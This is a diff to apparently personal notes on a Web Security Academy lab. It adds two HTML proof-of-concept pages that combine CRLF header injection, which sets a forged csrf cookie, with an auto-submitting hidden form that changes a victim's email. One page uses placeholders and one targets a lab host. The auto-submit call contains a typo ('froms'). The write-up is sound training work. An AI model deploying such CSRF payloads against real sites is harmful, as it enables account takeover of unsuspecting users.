@@ -136,3 +136,29 @@ This is an example of http header injection.
 We have newline after "test" and space, those are the URL encoded characters.
 Using this header injection we can set the cookie value of the CSRF token to something simple.
 And the reuse that CSRF token value for the body of the request.
+
+```html
+<html>
+	<body>
+	<script>history.pushState('','','/')</script>
+		<form action="change_email_url" method="POST">
+		<input type="hidden" name="email" value="test3&#64;test&#46;ca" />
+		<input type="hidden" name="csrf" value="test" />
+		<input type="submit" value="Submit request" />
+		<img src="url_with_http_header_injection" onerror="document.froms[0].submit()">
+	</body>
+</html>
+```
+
+```html
+<html>
+	<body>
+	<script>history.pushState('','','/')</script>
+		<form action="https://0af000340469358a8115664d00d600ad.web-security-academy.net/my-account/change-email" method="POST">
+		<input type="hidden" name="email" value="test3&#64;test&#46;ca" />
+		<input type="hidden" name="csrf" value="test" />
+		<input type="submit" value="Submit request" />
+		<img src="https://0af000340469358a8115664d00d600ad.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf-test" onerror="document.froms[0].submit()">
+	</body>
+</html>
+```
